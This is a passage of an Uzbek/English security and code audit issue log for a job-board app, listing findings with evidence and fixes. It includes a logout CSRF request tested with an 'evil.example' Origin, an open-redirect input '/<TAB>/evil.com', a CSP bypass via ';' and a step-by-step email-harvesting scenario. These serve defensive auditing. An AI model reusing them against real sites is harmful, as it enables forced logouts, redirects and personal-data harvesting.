**SameSite=None cookie bilan /api/auth/logout va /refresh cross-site oddiy POST'ga ochiq (logout CSRF — noqulaylik darajasida)**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT REPRODUCIBLE
- **Area:** security/csrf
- **Fayl:** `apps/api/src/modules/auth/auth.routes.ts:37`
- **Root cause:** REFRESH_COOKIE (auth.routes.ts:37-42): httpOnly, secure(prod), SameSite=None, path=/api/auth — cross-site arxitektura (Vercel+Railway) uchun majburiy. CORS (server.ts:486-495) ruxsatsiz origin'ni rad etadi, JSON body preflight talab qiladi. Lekin `fetch(url, {method:"POST", mode:"no-cors", credentials:"include"})` body'siz — preflight'siz yuboriladi: /refresh bajariladi (yangi accessToken javobi opaque — hujumchi o'qiy olmaydi, cookie yangilanadi — zarar yo'q), /logout (90-93) cookie'ni tozalaydi — foydalanuvchi begona saytdan chiqarib yuboriladi. Cookie `Origin` sarlavhasi tekshirilmaydi.
- **Impact:** Past: sessiya o'g'irlanmaydi; faqat majburiy logout. Origin tekshiruvi qo'shilsa to'liq yopiladi.
- **Evidence:** apps/api/src/modules/auth/auth.routes.ts:37-52,74-93; apps/api/src/server.ts:484-495.
- **Recommended fix:** authRoutes'ga preHandler: `/api/auth/refresh` va `/logout` uchun `Origin` sarlavhasi mavjud bo'lsa allowedOrigins/VERCEL_PREVIEW ga mos kelishini talab qiling (origin'siz — SSR/curl — ruxsat, hozirgi CORS mantiqi kabi). Yoki `Content-Type: application/json` ni majburiy qiling (no-cors bilan yuborib bo'lmaydi).
- **Dependencies:** env.ts allowedOrigins; e2e-check.mjs:169 cookie testi.
- **Risk:** Past.
- **Bajarilgan fix:** Alohida CSRF tokeni qo'shilmadi. Audit CORS o'zgarishidan keyin (D-006) brauzerdan kelgan cross-site logout server tomonda 403 bilan to'xtatiladi — seans saqlanadi.
- **Test/dalil:** Lokal API (nusxa baza): `POST /api/auth/logout` `Origin: https://evil.example` va `Origin: null`, `text/plain`, refresh cookie bilan → 403, refresh keyin ham ishladi; Origin'siz (brauzer bo'lmagan) so'rov → 200
- **Birlashtirilgan manbalar (2):**
  - R208 [auth, P3] `apps/api/src/modules/auth/auth.routes.ts:37` — SameSite=None refresh cookie: CSRF tahlili — refresh xavfsiz (javob o'qilmaydi), logout cross-site no-cors POST bilan tozalanishi mumkin (nuisance)
  - R263 [security-surface, P3] `apps/api/src/modules/auth/auth.routes.ts:90` — SameSite=None cookie bilan `/api/auth/logout` va `/api/auth/refresh` cross-site oddiy form POST'ga ochiq (CSRF logout)

### ISSUE-098

**Telegram/email HTML escape qamrovi tekshirildi va to'g'ri; renderEmail body parametri nomi xavfli ishlatishga yo'l qo'yadi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** WONT FIX
- **Area:** security/escaping
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:46`
- **Root cause:** Audit natijasi: chat xabari (chat.routes.ts:131 tgEscape), notify title/body (notifications.service.ts:94), support (support.routes.ts:135-140), admin reply (:278), email body'lar (applications.routes.ts:77,271-274; alerts.service.ts:155,171; team.routes.ts:144) — hammasi escape qilingan; renderEmail `body` ni xom qabul qiladi (mailer.ts:103) lekin barcha chaqiruvchilar escapeHtml ishlatadi. `phone` (:233 `+` + raqamlar) va `chatId` (:294) — raqamli, xavfsiz. `reason` → chat message matn sifatida saqlanadi, web'da dangerouslySetInnerHTML ishlatilmaydi (faqat JsonLd va THEME_INIT_SCRIPT).
- **Impact:** Hozir zaiflik yo'q; xavf — kelajakda `renderEmail({ body })` ga yangi chaqiruvchi escape'siz matn bersa. Nomuvofiqlik: `Errors`/AppError xabarlari Telegram'ga ketmaydi — OK.
- **Evidence:** telegram.service.ts:46-48; mailer.ts:72-116 (`${body}` xom); notifications.service.ts:125 `escapeHtml(input.body)`; grep dangerouslySetInnerHTML → 2 ta joy.
- **Recommended fix:** `renderEmail` ga `body` o'rniga `bodyHtml` nomi + JSDoc "escape qilingan bo'lishi shart"; yoki `bodyText` (avtomatik escape) va `bodyHtml` ikkita parametr. Chat message'lar uchun `CONTROL_CHARS` tozalash (support.routes.ts:33 kabi) — Telegram xabarini buzmaslik uchun.
- **Dependencies:** Yo'q
- **Risk:** Yo'q
- **Lead auditor izohi:** Axborot: amaldagi zaiflik topilmadi.
- **Bajarilgan fix:** Ma'lumot uchun (escaping to'g'ri ishlaydi).
- **Test/dalil:** —

### ISSUE-099

**API tsconfig moduleResolution 'Bundler' Node ESM runtime uchun kengaytmasiz importni ushlamaydi; support.routes.ts regex ichida xom control belgilar**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** PLAUSIBLE (audit agenti topgan, mustaqil qayta tekshirilmagan)
- **Holat:** NOT FIXED
- **Area:** infra/build
- **Fayl:** `apps/api/tsconfig.json:5`
- **Root cause:** api tsconfig module ESNext + moduleResolution Bundler (tsconfig.json:4-5), runtime esa `node dist/server.js` (package.json:15). tsc '.js'siz relative import'ni xato demaydi, nodemon'dagi tsx (nodemon.json:5) uni hal qiladi, shuning uchun muammo faqat prod'da ERR_MODULE_NOT_FOUND bo'lib chiqadi. Hozircha barcha import'lar .js bilan (grep bo'sh). support.routes.ts:33 regex ichida 149 ta xom control bayt (\x00 va boshqalar) bor, shuning uchun git/grep faylni 'binary' deb biladi (diff/review ko'rinmaydi).
- **Impact:** Kelajakda bitta extensionless import 'dev'da ishlaydi, prod'da yiqiladi' holatini keltirib chiqaradi. support.routes.ts o'zgarishlari PR/diff'da 'Binary files differ' bo'lib ko'rinadi.
- **Evidence:** apps/api/tsconfig.json:4-5; apps/api/nodemon.json:5; apps/api/package.json:15; `grep -c $'\x00' support.routes.ts` = 149, `file` → 'data'; support.routes.ts:33 CONTROL_CHARS.
- **Recommended fix:** api tsconfig: "module": "NodeNext", "moduleResolution": "NodeNext" (import'lar allaqachon .js bilan, shuning uchun o'zgarish kichik). support.routes.ts:33'ni escape bilan qayta yozing: /[\x00-\x1f]/g (ESLint no-control-regex izohi bilan). Lokal Node v24.15.0, engines >=20: CI'da Node 20 bilan ham build qiling (argon2 native prebuild).
- **Dependencies:** Yo'q
- **Risk:** Past (NodeNext ba'zi type import'larda qo'shimcha tuzatish talab qilishi mumkin).
- **Bajarilgan fix:** tsconfig bandlari o'zgartirilmadi.
- **Test/dalil:** —

### ISSUE-100

**Vercel va self-hosted SSR farqlari: robots/sitemap proxy faqat Vercel'da, HSTS preload, includeFiles dist/****

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** PLAUSIBLE (audit agenti topgan, mustaqil qayta tekshirilmagan)
- **Holat:** NOT FIXED
- **Area:** infra/deploy
- **Fayl:** `apps/web/vercel.json:8`
- **Root cause:** vercel.json:12-17 robots/sitemap'ni api/seo.js'ga yuboradi, apps/web/server/index.mjs'da bunday route yo'q va public/'da robots.txt yo'q, shuning uchun self-hosted'da /robots.txt Vike 404 bo'ladi. HSTS preload+includeSubDomains (vercel.json:29-30) custom domen ildizida barcha subdomenlarni (masalan api.*) majburan HTTPS qiladi va preload'dan chiqish qiyin. server/index.mjs:40-45 va api/ssr.js:73-78'da HSTS yo'q (drift). includeFiles: "dist/**" (vercel.json:8) dist/client'ni ham funksiya bundle'iga qo'shadi. apps/web/package.json'da engines yo'q (Vercel Node versiyasi default).
- **Impact:** Self-hosted variantda SEO fayllari yo'q. Custom domen ulanganda noto'g'ri HSTS preload subdomenlarni sindirishi mumkin. Funksiya hajmi va cold start oshadi.
- **Evidence:** apps/web/vercel.json:6-9,11-18,28-31; apps/web/server/index.mjs:40-45,99-118; apps/web/api/ssr.js:73-78; apps/web/api/seo.js:15; apps/web/package.json (engines yo'q).
- **Recommended fix:** includeFiles'ni "dist/server/**" ga toraytiring (Vike renderPage uchun dist/client/assets manifest kerak bo'lsa, tekshirib qoldiring). HSTS'dan 'preload'ni domen tayyor bo'lguncha olib tashlang. server/index.mjs'ga /robots.txt va /sitemap*.xml proxy (seo.js logikasi) qo'shing yoki self-hosted variant qo'llab-quvvatlanmasligini hujjatlang. "engines": {"node": ">=20"} qo'shing.
- **Dependencies:** Vike build manifest joylashuvi (includeFiles toraytirishdan oldin tekshirilsin).
- **Risk:** O'rta (includeFiles toraytirish SSR'ni sindirishi mumkin — preview deployda tekshiring).
- **Bajarilgan fix:** Vercel vs self-hosted qarori foydalanuvchida.
- **Test/dalil:** —

### ISSUE-101

**Playwright skriptlari (scripts/*.py) eskirgan URL, eski seed slug va qayd etilmagan dependency'ga tayanadi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** tests
- **Fayl:** `scripts/test_frontend.py:8`
- **Root cause:** '/search/vacancy' endi /vacancies'ga 301 redirect (apps/web/src/pages/search/vacancy/+guard.ts), '/vacancy/demo-frontend-dasturchi-react' esa /vacancies/:slug'ga 301 (pages/vacancy/@slug/+guard.ts). Slug eski seed.ts:179'dan olingan, demo-seed (@demo.ish.top) emas. test_hover.py qat'iy clip koordinatalari va 'Frontend dasturchi (React)' matniga bog'langan. playwright hech qayerda dependency sifatida ko'rsatilmagan, skriptlar hujjatlanmagan.
- **Impact:** Skriptlar redirect sahifalarni screenshot qiladi yoki demo-seed bilan 404 detail oladi. Dizayn regressiyasini ushlamaydi va chalg'itadi.
- **Evidence:** scripts/test_frontend.py:6-10,39; scripts/test_hover.py (page.goto '/search/vacancy', locator 'Frontend dasturchi (React)'); apps/api/src/prisma/seed.ts:179.
- **Recommended fix:** URL'larni /vacancies, /vacancies/<demo-seed slug>, /companies, /articles, /ru, /en ga yangilang. BASE_URL'ni env'dan oling. requirements.txt yoki README bo'limi qo'shing. Foydasiz bo'lsa test_hover.py'ni o'chiring.
- **Dependencies:** demo-seed slug'lari
- **Risk:** Past.
- **Bajarilgan fix:** Repo'dagi eski Playwright skriptlari yangilanmadi (audit uchun alohida regressiya skripti scratchpad'da ishlatildi).
- **Test/dalil:** —

### ISSUE-102

**setVacancyStatus/deleteVacancy/setApplicationStatus/deleteReview backend xabarini tashlab umumiy 'Xatolik' beradi**

- **Severity:** P3 (agent bahosi: P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** frontend/errors
- **Fayl:** `apps/web/src/lib/api.ts:760`
- **Root cause:** `setVacancyStatus` (760-768), `deleteVacancy` (770-777), `setApplicationStatus` (788-801), `deleteReview` (485-492) `!res.ok` da `new ApiError(res.status, "Xatolik")` — javob JSON'idagi `message`/`error` o'qilmaydi. Boshqa funksiyalar (`updateVacancy` 743-744) to'g'ri o'qiydi.
- **Impact:** Foydalanuvchi vakansiya holatini o'zgartira olmaganda sababi ("Bu holatdagi vakansiyaning holatini o'zgartirib bo'lmaydi") ko'rinmaydi; `isPhoneGateError` kabi kod bo'yicha aniqlash ishlamaydi.
- **Evidence:** api.ts:767 `if (!res.ok) throw new ApiError(res.status, "Xatolik");`; :800; :491.
- **Recommended fix:** Bitta `throwIfNotOk(res)` yordamchisi: `json?.message ?? "Xatolik", json?.error` — `updateVacancy` naqshi.
- **Dependencies:** —
- **Risk:** Past
- **Bajarilgan fix:** Mutatsiya xatolari server xabari va kodi bilan (`throwApiError`); vakansiya amallari aniq matnlar.
- **Test/dalil:** web typecheck/build PASS

### ISSUE-103

**Email/Telegram/push havolalari til prefiksini yo'qotadi; sitemap origin (WEB_ORIGIN) va canonical origin (VITE_SITE_URL) ikki xil manba**

- **Severity:** P3 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** NOT FIXED
- **Area:** i18n/links
- **Fayl:** `apps/api/src/modules/notifications/notifications.service.ts:60`
- **Root cause:** absoluteUrl = WEB_ORIGIN + url, foydalanuvchi tili hisobga olinmaydi. chat.routes.ts:131 (`${env.WEB_ORIGIN}/messages`), alerts.service.ts:153 (`/vacancies/slug`) va public/sw.js:29-40 (push `client.navigate(target)`) ham shunday. robots/sitemap URL'lari env.WEB_ORIGIN'dan (seo.routes.ts:14), canonical/hreflang esa VITE_SITE_URL'dan (lib/i18n/config.ts:21-23) olinadi. WEB_ORIGIN default 'http://localhost:5173' (env.ts:24), web dev esa 3001'da.
- **Impact:** ru/en foydalanuvchi har bir bildirishnomadan o'zbekcha sahifaga tushadi. WEB_ORIGIN Vercel domeniga (masalan ishbor.vercel.app), VITE_SITE_URL esa custom domenga sozlansa, sitemap'dagi barcha URL'lar canonical'dan boshqa host'da bo'ladi va Google sitemap'ni 'canonical emas' deb e'tiborsiz qoldiradi. WEB_ORIGIN prod'da berilmasa, xatlarda localhost havolalari ketadi.
- **Evidence:** notifications.service.ts:60 `const absoluteUrl = input.url ? `${env.WEB_ORIGIN}${input.url}` : env.WEB_ORIGIN;`; env.ts:24 `WEB_ORIGIN: z.string().default("http://localhost:5173")`; config.ts:22 `VITE_SITE_URL || "http://localhost:3001"`.
- **Recommended fix:** notify()'da user locale'ni oling (agar User/Profile'da til saqlansa; bo'lmasa cookie'dan olingan tilni profilga yozish) va `loc(locale, url)` qo'llang (seo.routes.ts:22 dagi funksiyani common'ga chiqaring). Prod'da WEB_ORIGIN'ni majburiy qiling (`isProd` bo'lsa default yo'q) va DEPLOY.md'da WEB_ORIGIN === VITE_SITE_URL talabini yozing; yoki sitemap uchun alohida PUBLIC_SITE_URL env'ini qo'shing.
- **Dependencies:** User modelida locale maydoni bormi — tekshirilmagan; DEPLOY.md
- **Risk:** Past (env validatsiyasi prod deploy'ni to'xtatishi mumkin — ataylab).
- **Bajarilgan fix:** Bildirishnoma havolalarida til prefiksi qo'shilmadi.
- **Test/dalil:** —

## PHASE 6 — ikkinchi audit topilmalari (ISSUE-104 … ISSUE-146)

- Birinchi tuzatishlardan keyin 5 yo'nalish (API authz/security, API data/performance, web session/realtime, web UI holatlari/i18n, testlar va hujjatlar) bo'yicha "yangi xato qayerda bo'lishi mumkin?" nuqtai nazaridan qayta audit o'tkazildi.
- 46 ta xom topilma; 3 tasi takror bo'lgani uchun birlashtirildi — 43 ta noyob muammo.
- P0–P2 dan 9 tasi alohida verify agenti tomonidan rad etishga urinib tekshirildi (hammasi tasdiqlandi, 3 tasining severity'si pasaytirildi). Qolgan 37 tasi agentlar tomonidan mustaqil tekshirilmagan; lead auditor ulardan 31 tasining kodini fix'dan oldin o'qib tasdiqladi.
- Sarlavhalar o'zbekchaga o'girilgan. "Agent sarlavhasi", "Failure scenario", "Evidence" va "Recommended fix" maydonlari agentlarning asl (inglizcha) matni.

| Severity | Soni |
|---|---|
| P0 | 0 |
| P1 | 1 |
| P2 | 16 |
| P3 | 26 |
| Jami | 43 |

| Holat | Soni |
|---|---|
| FIXED | 39 |
| NOT FIXED | 1 |
| PARTIAL | 2 |
| WONT FIX | 1 |

| ID | Sev | Holat | Verdict | Sarlavha |
|---|---|---|---|---|
| [ISSUE-104](#issue-104) | P1 | FIXED | CONFIRMED-A | Suhbatlar ro'yxati va suhbatdosh profili orqali nomzod emaili telefoni tasdiqlangan istalgan ish beruvchiga oshkor bo'lardi (ISSUE-008 fix'ini chetlab o'tish) |
| [ISSUE-105](#issue-105) | P2 | FIXED | CONFIRMED-A | Eskirgan tab jimgina boshqa hisob tokeniga o'tib, o'zidagi eski ma'lumotni o'sha hisobga yozardi |
| [ISSUE-107](#issue-107) | P2 | FIXED | CONFIRMED-A | Maqola PUT eski muqovani boshqa maqolalarni tekshirmay o'chirardi: kontent muallifi chop etilgan maqola muqovasini o'chira olardi |
| [ISSUE-108](#issue-108) | P2 | FIXED | CONFIRMED-A | ISSUE-035 fix'i faqat /api/admin/* ni qamragan: roli olingan admin va bloklangan ish beruvchi 15 daqiqagacha huquqlarini saqlardi |
| [ISSUE-109](#issue-109) | P2 | FIXED | CONFIRMED-A | Obuna sweep'i ishlayotgan paytda chop etilgan vakansiyalar uchun takroriy bildirishnoma yuborardi |
| [ISSUE-111](#issue-111) | P2 | FIXED | CONFIRMED-A | 2000 talik arizalar chegarasi web'da ko'rinmasdi: API `total`/`limit` tashlab yuborilib, sonlar kesilgan ro'yxatdan hisoblanardi |
| [ISSUE-112](#issue-112) | P2 | FIXED | CONFIRMED-A | Ommaviy xabar Telegram va SMTP'ni tezlik cheklovisiz to'ldirardi; tashqi yuborishlarning ko'pi jimgina yo'qolardi |
| [ISSUE-113](#issue-113) | P2 | FIXED | CONFIRMED-C | Refresh route vaqtinchalik baza xatosini "seans yo'q" deb cookie'ni tozalardi va klient foydalanuvchini chiqarib yuborardi |
| [ISSUE-114](#issue-114) | P2 | FIXED | CONFIRMED-C | WS tayyorlik tekshiruvidagi vaqtinchalik baza xatosi 4403 bilan yopardi, klient buni doimiy deb real-time'ni o'chiq qoldirardi |
| [ISSUE-115](#issue-115) | P2 | FIXED | CONFIRMED-C | TelegramConnect: bitta muvaffaqiyatsiz holat so'rovi sahifa yangilanguncha telefon tasdig'ini bloklardi |
| [ISSUE-116](#issue-116) | P2 | FIXED | CONFIRMED-C | Telefoni tasdiqlanmagan ish beruvchi vakansiyani qayta faollashtirganda telefon eslatmasi o'rniga umumiy xato ko'rardi |
| [ISSUE-117](#issue-117) | P2 | FIXED | CONFIRMED-C | Kompaniyasiz ish beruvchiga nomzodlar sahifasi "internetni tekshiring" derdi va qayta urinish hech qachon ishlamasdi |
| [ISSUE-118](#issue-118) | P2 | FIXED | CONFIRMED-C | Qo'ng'iroq menyusi API xatosida hali ham "Bildirishnomalar yo'q" ko'rsatardi |
| [ISSUE-119](#issue-119) | P2 | FIXED | CONFIRMED-C | `.env.example` dagi JWT namuna qiymatlari ISSUE-009 uchun qo'shilgan production tekshiruvidan o'tardi |
| [ISSUE-120](#issue-120) | P2 | FIXED | CONFIRMED-C | `[ISSUE-003/040]` WebSocket e2e tekshiruvi bo'sh edi: global unhandledRejection handler `/health` 200 ni kafolatlardi |
| [ISSUE-121](#issue-121) | P2 | PARTIAL | CONFIRMED-C | Web P0/P1 fix'larida avtomatik regressiya tekshiruvi yo'q edi, dalil sifatida ko'rsatilgan FINAL_AUDIT.md hali yaratilmagan edi |
| [ISSUE-122](#issue-122) | P2 | NOT FIXED | PLAUSIBLE | ISSUE-010 va ISSUE-013 (P1) fix'ni sinaydigan testsiz FIXED deb belgilangan; ISSUE-010 uchun qaror yozuvi yo'q edi |
| [ISSUE-106](#issue-106) | P3 | FIXED | CONFIRMED-A | `/uploads/` CSP sandbox'ini yo'lga `;` qo'shib chetlab o'tish mumkin edi (eski SVG logolardagi skript ishlardi) |
| [ISSUE-110](#issue-110) | P3 | FIXED | CONFIRMED-A | Obuna qidiruvdan oldin band qilinardi: qidiruv xato bersa bildirishnoma oynasi yo'qolardi (regressiya) |
| [ISSUE-123](#issue-123) | P3 | FIXED | CONFIRMED-C | Logout allaqachon bekor qilingan refresh tokenni qabul qilardi: eski o'g'irlangan cookie qurbonni qayta-qayta hamma joydan chiqara olardi |
| [ISSUE-124](#issue-124) | P3 | FIXED | CONFIRMED-C | `safeInternalPath` "/<TAB>/evil.com" ni qabul qilardi — brauzer uni tashqi manzilga aylantiradi (open redirect) |
| [ISSUE-125](#issue-125) | P3 | FIXED | CONFIRMED-C | Yagona global ma'lumot versiyasi: har ariza yozuvi 20k qatorli maosh to'plamini qayta yuklatib, 5 daqiqalik keshni befoyda qilardi |
| [ISSUE-126](#issue-126) | P3 | FIXED | CONFIRMED-C | `reindexAll` Prisma cursor sahifalashi: chegara vakansiyasi o'chirilsa qolgan faol vakansiyalar Meilisearch'dan o'chirilardi |
| [ISSUE-127](#issue-127) | P3 | WONT FIX | PLAUSIBLE | Maosh saralashi va filtri faqat `salaryMax` yozilgan vakansiyalarni maoshsiz deb hisoblaydi, maosh statistikasi esa hisobga oladi |
| [ISSUE-128](#issue-128) | P3 | FIXED | CONFIRMED-C | Ochiq vakansiya detail'i har ko'rishda kompaniyaning barcha tasdiqlangan sharhlarini chegarasiz yuklardi |
| [ISSUE-129](#issue-129) | P3 | FIXED | CONFIRMED-C | `PUT /api/vacancies/:id` da eski masofaviy fallback yo'q edi: PATCH status qabul qiladigan yozuvni rad etardi |
| [ISSUE-130](#issue-130) | P3 | FIXED | CONFIRMED-C | Admin overview "bugun" ni 24 soatlik oynadan, grafik va bosh sahifa esa Toshkent kunidan hisoblardi |
| [ISSUE-131](#issue-131) | P3 | FIXED | CONFIRMED-C | `logout()` dan keyin tugagan refresh token xotira va localStorage'ga qaytib yozilardi — chiqish qayta yuklashda saqlanmasdi |
| [ISSUE-132](#issue-132) | P3 | FIXED | CONFIRMED-C | Header nishonlari har muvaffaqiyatsiz so'rovda 0 ga tushardi (qo'ng'iroq uchun ISSUE-067 fix'idan farqli) |
| [ISSUE-133](#issue-133) | P3 | FIXED | CONFIRMED-C | WS 4401: `useNotifications` da qayta urinish chegarasi yo'q edi, `null` refresh AuthProvider'ni mehmon holatiga o'tkazmasdi |
| [ISSUE-134](#issue-134) | P3 | FIXED | CONFIRMED-C | Kompaniya sarlavhasi foydalanuvchi o'z sharhini o'chirgandan keyin eski sharh soni va reytingni ko'rsatardi |
| [ISSUE-135](#issue-135) | P3 | FIXED | CONFIRMED-C | Nomzodlar ro'yxati birinchi 50 profilda to'xtardi, qolganlarini ko'rish yo'li yo'q edi |
| [ISSUE-136](#issue-136) | P3 | FIXED | CONFIRMED-C | Kompaniya sahifasidagi vakansiyalar soni 100 da to'xtardi; API qaytargan `_count` ishlatilmasdi |
| [ISSUE-137](#issue-137) | P3 | FIXED | CONFIRMED-C | Admin jadvallari yangi filtr yuklanayotganda oldingi filtrning qatorlarini, pager'ini va bo'sh matnini ko'rsatardi |
| [ISSUE-138](#issue-138) | P3 | FIXED | CONFIRMED-C | Bosh sahifaning har SSR'i 6 ta kategoriya soni uchun to'liq facets aggregatsiyasini bajarardi |
| [ISSUE-139](#issue-139) | P3 | FIXED | CONFIRMED-C | Nomzod profili hududlarni hali xatoni yashiradigan fetcher bilan yuklardi (ish beruvchi uchun ISSUE-018 da tuzatilgan holat) |
| [ISSUE-140](#issue-140) | P3 | FIXED | CONFIRMED-C | ISSUES.md fix'ni tasdiqlamaydigan e2e tekshiruvlarini dalil sifatida ko'rsatardi (ISSUE-057, 079, 087, 092) |
| [ISSUE-141](#issue-141) | P3 | PARTIAL | CONFIRMED-C | `CORS_PREVIEW_ORIGIN_REGEX` ruxsat yo'li testlanmagan; `env.ts` izohidagi namuna hech qachon mos kelmasdi |
| [ISSUE-142](#issue-142) | P3 | FIXED | PLAUSIBLE | D-012 va D-016 dagi maxfiylik qoidalari amalga oshirilgan, lekin e2e tasdig'i yo'q edi |
| [ISSUE-143](#issue-143) | P3 | FIXED | CONFIRMED-C | Zaif denylist tasdiqlari: `[ISSUE-001]` kalit nomi o'zgarsa ham o'tardi; `[ISSUE-030]` tokenning o'zini tekshirmasdi |
| [ISSUE-144](#issue-144) | P3 | FIXED | CONFIRMED-C | e2e hermetik emas edi: dotenv va ota muhit sozlamalari o'tib ketardi; `[ISSUE-011]` xato kodini tekshirmasdi |
| [ISSUE-145](#issue-145) | P3 | FIXED | CONFIRMED-C | ISSUE-065 FIXED deb belgilangan, lekin DEPLOY.md hali e2e tarif limitini tekshiradi derdi |
| [ISSUE-146](#issue-146) | P3 | FIXED | CONFIRMED-C | ISSUE-062 dagi eskirgan dist bo'shlig'i: `test:e2e` eski build'ni sinashi mumkin edi |

### ISSUE-104

**Suhbatlar ro'yxati va suhbatdosh profili orqali nomzod emaili telefoni tasdiqlangan istalgan ish beruvchiga oshkor bo'lardi (ISSUE-008 fix'ini chetlab o'tish)**

- **Severity:** P1
- **Verdict:** CONFIRMED (alohida verify agenti topilmani rad etishga urinib, tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-authz-security
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:369`
- **Agent sarlavhasi:** Seeker email still leaks to any phone-verified employer via conversation list and user summary, which undoes the ISSUE-008 fix
- **Failure scenario:** 1. Employer E has a verified phone but no applications from seeker S. E calls GET /api/candidates, which is now free for every employer (D-012), and gets S's userId. S is open to work, has a published resume and has no headline (the default after registration). 2. E calls POST /api/conversations/start {candidateUserId: S}. This is allowed because S is 'discoverable' (lines 243-251). No message is sent and S is not notified. 3. E calls GET /api/conversations. The item's subtitle is S's email (line 369: `sp?.headline ?? c.seeker.email`). The title is also the email when first and last name are empty (lines 367-368). 4. GET /api/users/S/summary also returns `name: user.email` when the names are empty (lines 563-565). Looping over /api/candidates (200 pages x 50) collects the emails of the whole open-candidate pool. D-012 says contacts are only for applicants, and /api/candidates correctly nulls them (candidates.routes.ts:123-124).
- **Evidence:** - apps/api/src/modules/chat/chat.routes.ts:298-304 selects `seeker: { select: { email: true, ... } }`. - chat.routes.ts:367-369: - `const seekerName = [sp?.firstName, sp?.lastName].filter(Boolean).join(" ") || c.seeker.email;` - `const subtitle = iAmEmployer ? sp?.headline ?? c.seeker.email : c.company?.name ? "Ish beruvchi" : c.employer.email;` - chat.routes.ts:563-565 summary `name: p ? [p.firstName, p.lastName].filter(Boolean).join(" ") || user.email : comp?.name ?? user.email`. - chat.routes.ts:243-244 start is allowed when `isOpenToWork && resumes.length`. No message or notification is created (getOrCreateConversation, lines 26-56). - apps/api/src/modules/candidates/candidates.routes.ts:31-34: only the employer role and a company are needed. Line 121 returns `userId`; lines 123-124 null out email and phone. - apps/api/src/modules/resume/resume.routes.ts:140 always sets `status: "published"`. schema.prisma:215 `headline String?` and 219 `isOpenToWork @default(true)`. - apps/api/src/modules/auth/auth.service.ts:52-53 `firstName: input.firstName ?? ""`. apps/web/src/pages/signup/+Page.tsx:87-102: name fields have no `required`. - apps/web/src/components/profile/PersonalInfo.tsx:87 `headline: form.headline || null`. - apps/web/src/pages/employer/candidates/+Page.tsx:74 `startConversation(accessToken, { candidateUserId })`. apps/web/src/lib/messages/adapter.ts:143 `const title = text(r.title) ?? company?.name`. The title is rendered in PartnerDetails (ConversationDetails.tsx:127-136). - `git diff HEAD` shows lines 367-369 and 563-565 unchanged by the audit, while D-012 (DECISIONS.md:128-137) and ISSUE-008 (ISSUES.md:42, FIXED) promise contacts only for applicants. - apps/api/scripts/e2e-check.mjs:1367-1377 (ISSUE-039) never asserts that no email is returned.
- **Recommended fix:** Remove the email fallbacks in /api/conversations and /api/users/:id/summary. Use neutral labels instead (e.g. 'Nomzod' / 'Ish beruvchi'). Only select `email` when the viewer may see contacts (the seeker applied to one of the viewer's vacancies, or the viewer is an admin checked against the database). Add an e2e check: start a conversation with a discoverable candidate that has no headline, then assert no email appears in either response.
- **Bajarilgan fix:** `GET /api/conversations` va `GET /api/users/:id/summary` endi email tanlamaydi va qaytarmaydi; ism yo'q bo'lsa `title`/`name` = `null`. Web rol bo'yicha lokal nom ko'rsatadi (Nomzod / Ish beruvchi / qo'llab-quvvatlash), qidiruv shu nom bo'yicha ishlaydi.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-V1]` — ismsiz, headline'siz nomzod va kompaniyasiz ish beruvchi javoblarida email yo'q; web typecheck/build PASS

### ISSUE-105

**Eskirgan tab jimgina boshqa hisob tokeniga o'tib, o'zidagi eski ma'lumotni o'sha hisobga yozardi**

- **Severity:** P2 (agent bahosi: P1)
- **Verdict:** CONFIRMED (alohida verify agenti topilmani rad etishga urinib, tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-session-realtime
- **Fayl:** `apps/web/src/lib/auth/session.ts:73`
- **Agent sarlavhasi:** A stale tab silently switches to another account's token and writes that tab's old data into the other account
- **Failure scenario:** Tab A is signed in as seeker X and has the /profile resume editor loaded. In the same browser, tab B logs in as seeker Y. The refreshToken cookie (path /api/auth) is shared, so it now belongs to Y. In tab A, the next refresh (12-minute interval, a visibilitychange, or any 401 from the 20s inbox or 45s notification polling) sends Y's cookie, and the server issues Y's access token. refreshSession stores it (`current` = Y, and localStorage too). The interceptor (line 107) then rewrites every Bearer header to Y. By design (D-023) the React state never changes, so tab A still shows X's name, userId and loaded resume. Clicking Save sends PUT /api/resume, which replaces the whole resume, with X's resume on Y's account. Chat sends and marks-read also go out as Y, and the WS reconnects as Y while useMessenger still decides 'mine' using X's userId. Before the audit, the interval called setToken(fresh), which changed the context token and made pages re-fetch with the new identity, so stale X data was never written to Y.
- **Evidence:** - apps/api/src/modules/auth/auth.routes.ts:39-48, 70-73: the cookie path is "/api/auth", and login always calls setRefreshCookie, overwriting the shared cookie. - apps/api/src/modules/auth/auth.service.ts:130-143: refreshSession issues tokens for payload.sub from the cookie. - apps/web/src/lib/auth/session.ts:71-74: `inflight = requestRefresh().then((token) => { if (token) setAccessToken(token); return token; })`. There is no comparison of sub. - apps/web/src/lib/auth/session.ts:107: `if (current && auth !== `Bearer ${current}`) headers.set("Authorization", `Bearer ${current}`)`. - apps/web/src/components/AuthContext.tsx:120-125: run() only sets lastRefresh.current or calls becomeGuest. It never calls setToken or setUser. - A grep for "storage" or BroadcastChannel in apps/web/src finds nothing. - apps/web/src/pages/profile/+Page.tsx:29,39,49: SeekerHub gets the context accessToken and passes it to useProfileCore. - apps/web/src/lib/profile/useProfileData.ts:63-92: load has dependency [token], so it does not re-run. - apps/web/src/lib/profile/useProfileData.ts:119-122: `merged = {...EMPTY_RESUME, ...resumeRef.current, ...patch}` then `putResume(token, toInput(merged, fallback))`. - apps/web/src/lib/api.ts:601-606: saveResume uses fetch to `${API_URL}/api/resume` with a Bearer header, so the interceptor applies. - apps/api/src/modules/resume/resume.routes.ts:82-87, 132-149: requireRole("job_seeker"), `userId = 